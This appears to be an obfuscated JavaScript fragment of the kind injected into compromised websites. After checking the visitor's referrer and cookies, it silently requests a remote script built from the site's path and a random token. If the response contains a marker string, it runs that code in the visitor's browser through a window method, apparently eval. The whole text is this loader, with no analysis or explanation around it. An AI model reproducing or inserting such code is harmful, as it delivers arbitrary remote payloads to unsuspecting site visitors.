_0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};